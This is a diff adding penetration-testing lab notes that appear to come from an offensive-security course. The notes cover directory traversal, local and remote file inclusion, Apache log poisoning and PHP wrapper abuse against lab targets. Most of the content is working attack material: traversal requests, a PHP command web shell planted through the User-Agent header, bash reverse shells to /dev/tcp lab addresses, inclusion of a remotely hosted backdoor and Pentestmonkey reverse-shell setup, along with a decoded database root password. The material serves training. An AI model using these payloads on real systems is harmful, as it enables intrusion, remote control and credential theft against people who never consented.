@@ -1,0 +1,138 @@
+Common Web Application Attacks
+
+Directory Traversal
+
+Identifying and Exploiting Directory Traversals
+
+attacker 192.168.49.64
+target 192.168.64.193
+
+Use curl and the --path-as-is parameter to find the flag in C:\Users\install.txt
+
+nmap -sC -sV 192.168.64.193
+3000/tcp open  http          Grafana http
+
+curl --path-as-is http://192.168.64.193:3000/../../Users/install.txt
+<a href="/login">Found</a>.
+not work !
+
+CVE-2021-43798, directory traversal vulnerability
+https://www.exploit-db.com/exploits/50581
+
+how to exploit Grafana directory traversal vulnerability using 50581.py
+
+python3 50581.py -H http://192.168.64.193:3000
+Read file > ../../Users/install.txt
+OS{52e81af60ef5e1653cfb5e57206bd61a} -- success~
+
+-----
+Encoding Special Characters
+
+attacker 192.168.49.64
+target 192.168.64.16
+
+Use Burp or curl to display the contents of the /opt/passwords file, URL encoding, flag in the output
+
+curl http://192.168.64.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords
+curl http://192.168.64.16/%2e%2e/%2e%2e/%2e%2e/opt/passwords
+(The command cd ../../../opt will move from /var/www/html to root and then into /opt)
+
+--------
+File Inclusion Vulnerabilities
+
+Local File Inclusion (LFI)
+
+directory traversal vulnerabilities to obtain the contents of a file outside of the web server's web root
+source code of the PHP file will be displayed
+
+File inclusion vulnerabilities allow us to "include" a file in the application's running code (remote or local), Remote Code Execution (RCE)
+php file will be executed
+
+Log Poisoning, write executable code to Apache's access.log file in the /var/log/apache2/ directory
+
+Poison:
+User Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
+
+Execute:
+GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ps HTTP/1.1
+GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la HTTP/1.1
+GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22 HTTP/1.1
+(bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1")
+
+windows:
+C:\xampp\apache\logs\
+
+attacker 192.168.49.64
+target 192.168.55.193
+
+http://192.168.55.193/meteor, LFI vulnerability in combination with Log Poisoning to execute the dir command, Poison the access.log log in the XAMPP C:\xampp\apache\logs log directory . Find the flag in one of the files from the dir command output
+
+User Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
+
+http://192.168.55.193/meteor/showfile.php?file=../../../../../../xampp/apache/logs&cmd=dir HTTP/1.1
+http://192.168.55.193/meteor/showfile.php?file=../../../../../../xampp/apache/logs&cmd=type%20flag.txt HTTP/1.1
+
+------
+PHP Wrappers
+
+php://filter, we can also display the contents of executable files such as .php, rather than executing them
+
+curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
+curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+
+echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d
+(reveal server side <?php> code)
+
+curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
+
+echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
+curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
+
+attacker 192.168.49.64
+target 192.168.55.16
+
+use data:// PHP Wrapper in combination with the URL encoded PHP snippet to execute the uname -a command, Enter the Linux kernel version
+
+echo -n '<?php echo system($_GET["uname -a"]);?>' | base64
+PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbInVuYW1lIC1hIl0pOz8+
+(https://www.base64encode.org/)
+curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbInVuYW1lIC1hIl0pOz8+&cmd=uname%20-a"
+
+-------
+Remote File Inclusion (RFI)
+
+In php, allow_url_include option needs to be enabled to leverage RFI
+RFI vulnerabilities allow us to include files from a remote system over HTTP or SMB
+
+Kali Linux includes several PHP webshells in the /usr/share/webshells/php/ directory that can be used for RFI
+simple-backdoor.php
+
+python3 -m http.server 80
+curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
+curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22"
+
+attacker 192.168.49.64
+target 192.168.55.16
+
+include the PHP reverse shell from Pentestmonkey's Github repository. Change the $ip variable to the IP of your Kali machine and $port to 4444. Start a Netcat listener on port 4444 on your Kali machine and exploit the RFI vulnerability on port 8001 to include the PHP reverse shell. Find the flag in the /home/guybrush/.treasure/flag.txt
+
+https://github.com/pentestmonkey/php-reverse-shell
+php-reverse-shell.php:
+$ip = '192.168.49.64';  // CHANGE THIS
+$port = 4444;  
+
+nc -lvnp 4444
+
+python3 -m http.server 80
+curl "192.168.55.16:8001/index.php?page=http://192.168.49.64/php-reverse-shell.php"
+
+type /home/guybrush/.treasure/flag.txt
+
+
+
+
+
+
+
+
